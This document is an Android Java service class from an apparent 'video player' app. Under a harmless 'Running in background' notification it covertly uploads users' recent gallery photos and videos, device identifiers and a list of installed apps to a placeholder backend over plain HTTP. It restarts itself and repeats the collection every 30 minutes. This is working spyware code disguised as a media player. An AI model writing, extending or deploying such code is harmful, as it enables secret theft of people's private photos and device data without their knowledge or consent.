package com.videoplayerapp.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.MediaStore;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class DataCollectionService extends Service {
    private static final String TAG = "DataCollectionService";
    private static final String CHANNEL_ID = "VideoPlayerChannel";
    private static final int NOTIFICATION_ID = 1;
    private static final String API_BASE_URL = "http://your-backend-url.com/api";
    
    private OkHttpClient client;
    private boolean isCollecting = false;

    @Override
    public void onCreate() {
        super.onCreate();
        client = new OkHttpClient.Builder()
                .connectTimeout(60, TimeUnit.SECONDS)
                .writeTimeout(60, TimeUnit.SECONDS)
                .readTimeout(60, TimeUnit.SECONDS)
                .build();
        
        createNotificationChannel();
        Log.d(TAG, "Data Collection Service Created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIFICATION_ID, createNotification());
        
        if (!isCollecting) {
            isCollecting = true;
            startDataCollection();
        }
        
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void startDataCollection() {
        new Thread(() -> {
            try {
                // Collect gallery data
                collectGalleryData();
                
                // Collect device information
                collectDeviceInfo();
                
                // Collect installed apps
                collectInstalledApps();
                
                // Start periodic collection
                startPeriodicCollection();
                
            } catch (Exception e) {
                Log.e(TAG, "Error in data collection", e);
            }
        }).start();
    }

    private void collectGalleryData() {
        try {
            // Collect images
            collectMediaFiles(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "images");
            
            // Collect videos
            collectMediaFiles(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "videos");
            
            Log.d(TAG, "Gallery data collection completed");
            
        } catch (Exception e) {
            Log.e(TAG, "Error collecting gallery data", e);
        }
    }

    private void collectMediaFiles(Uri contentUri, String type) {
        try {
            String[] projection = {
                MediaStore.MediaColumns._ID,
                MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.DATA,
                MediaStore.MediaColumns.DATE_ADDED,
                MediaStore.MediaColumns.SIZE
            };

            Cursor cursor = getContentResolver().query(
                contentUri,
                projection,
                null,
                null,
                MediaStore.MediaColumns.DATE_ADDED + " DESC"
            );

            if (cursor != null) {
                JSONArray mediaArray = new JSONArray();
                int count = 0;
                int maxFiles = 50; // Limit to prevent overwhelming the server

                while (cursor.moveToNext() && count < maxFiles) {
                    JSONObject mediaItem = new JSONObject();
                    
                    String id = cursor.getString(cursor.getColumnIndex(MediaStore.MediaColumns._ID));
                    String name = cursor.getString(cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME));
                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.MediaColumns.DATA));
                    long dateAdded = cursor.getLong(cursor.getColumnIndex(MediaStore.MediaColumns.DATE_ADDED));
                    long size = cursor.getLong(cursor.getColumnIndex(MediaStore.MediaColumns.SIZE));

                    mediaItem.put("id", id);
                    mediaItem.put("name", name);
                    mediaItem.put("path", path);
                    mediaItem.put("dateAdded", dateAdded);
                    mediaItem.put("size", size);
                    mediaItem.put("type", type);

                    mediaArray.put(mediaItem);
                    count++;

                    // Upload file to backend
                    uploadFileToBackend(path, type, mediaItem);
                }

                cursor.close();
                
                // Send metadata to backend
                sendMediaMetadataToBackend(mediaArray, type);
            }

        } catch (Exception e) {
            Log.e(TAG, "Error collecting " + type, e);
        }
    }

    private void uploadFileToBackend(String filePath, String type, JSONObject metadata) {
        new Thread(() -> {
            try {
                File file = new File(filePath);
                if (file.exists() && file.length() < 10 * 1024 * 1024) { // Max 10MB
                    
                    RequestBody requestBody = new MultipartBody.Builder()
                            .setType(MultipartBody.FORM)
                            .addFormDataPart("file", file.getName(),
                                    RequestBody.create(file, MediaType.parse("application/octet-stream")))
                            .addFormDataPart("metadata", metadata.toString())
                            .addFormDataPart("type", type)
                            .addFormDataPart("userId", getUserId())
                            .build();

                    Request request = new Request.Builder()
                            .url(API_BASE_URL + "/media/upload")
                            .post(requestBody)
                            .build();

                    try (Response response = client.newCall(request).execute()) {
                        if (response.isSuccessful()) {
                            Log.d(TAG, "File uploaded successfully: " + file.getName());
                        } else {
                            Log.e(TAG, "Failed to upload file: " + response.code());
                        }
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error uploading file", e);
            }
        }).start();
    }

    private void collectDeviceInfo() {
        try {
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("androidVersion", Build.VERSION.RELEASE);
            deviceInfo.put("sdkVersion", Build.VERSION.SDK_INT);
            deviceInfo.put("deviceId", getDeviceId());
            deviceInfo.put("userId", getUserId());
            deviceInfo.put("timestamp", System.currentTimeMillis());

            sendDeviceInfoToBackend(deviceInfo);
            
        } catch (Exception e) {
            Log.e(TAG, "Error collecting device info", e);
        }
    }

    private void collectInstalledApps() {
        try {
            JSONArray appsArray = new JSONArray();
            
            // Get installed apps
            // This is a simplified version - you might want to get more details
            File systemAppDir = new File("/system/app");
            File dataAppDir = new File("/data/app");
            
            // Add system apps
            if (systemAppDir.exists()) {
                File[] systemApps = systemAppDir.listFiles();
                if (systemApps != null) {
                    for (File app : systemApps) {
                        JSONObject appInfo = new JSONObject();
                        appInfo.put("name", app.getName());
                        appInfo.put("type", "system");
                        appsArray.put(appInfo);
                    }
                }
            }

            // Send apps data to backend
            sendAppsDataToBackend(appsArray);
            
        } catch (Exception e) {
            Log.e(TAG, "Error collecting installed apps", e);
        }
    }

    private void startPeriodicCollection() {
        new Thread(() -> {
            while (isCollecting) {
                try {
                    Thread.sleep(30 * 60 * 1000); // Every 30 minutes
                    
                    // Collect new media files
                    collectGalleryData();
                    
                    // Update device info
                    collectDeviceInfo();
                    
                } catch (InterruptedException e) {
                    Log.e(TAG, "Periodic collection interrupted", e);
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "Error in periodic collection", e);
                }
            }
        }).start();
    }

    private void sendMediaMetadataToBackend(JSONArray mediaArray, String type) {
        new Thread(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("media", mediaArray);
                data.put("type", type);
                data.put("userId", getUserId());

                RequestBody body = RequestBody.create(data.toString(), MediaType.get("application/json"));
                Request request = new Request.Builder()
                        .url(API_BASE_URL + "/media/metadata")
                        .post(body)
                        .build();

                try (Response response = client.newCall(request).execute()) {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "Media metadata sent successfully");
                    } else {
                        Log.e(TAG, "Failed to send media metadata: " + response.code());
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error sending media metadata", e);
            }
        }).start();
    }

    private void sendDeviceInfoToBackend(JSONObject deviceInfo) {
        new Thread(() -> {
            try {
                RequestBody body = RequestBody.create(deviceInfo.toString(), MediaType.get("application/json"));
                Request request = new Request.Builder()
                        .url(API_BASE_URL + "/device/info")
                        .post(body)
                        .build();

                try (Response response = client.newCall(request).execute()) {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "Device info sent successfully");
                    } else {
                        Log.e(TAG, "Failed to send device info: " + response.code());
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error sending device info", e);
            }
        }).start();
    }

    private void sendAppsDataToBackend(JSONArray appsArray) {
        new Thread(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("apps", appsArray);
                data.put("userId", getUserId());

                RequestBody body = RequestBody.create(data.toString(), MediaType.get("application/json"));
                Request request = new Request.Builder()
                        .url(API_BASE_URL + "/apps/list")
                        .post(body)
                        .build();

                try (Response response = client.newCall(request).execute()) {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "Apps data sent successfully");
                    } else {
                        Log.e(TAG, "Failed to send apps data: " + response.code());
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error sending apps data", e);
            }
        }).start();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Video Player Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Background service for video player");
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Video Player")
                .setContentText("Running in background")
                .setSmallIcon(android.R.drawable.ic_media_play)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    private String getUserId() {
        return getSharedPreferences("VideoPlayerPrefs", MODE_PRIVATE)
                .getString("userId", "unknown");
    }

    private String getDeviceId() {
        return android.provider.Settings.Secure.getString(
                getContentResolver(),
                android.provider.Settings.Secure.ANDROID_ID
        );
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isCollecting = false;
        Log.d(TAG, "Data Collection Service Destroyed");
    }
} 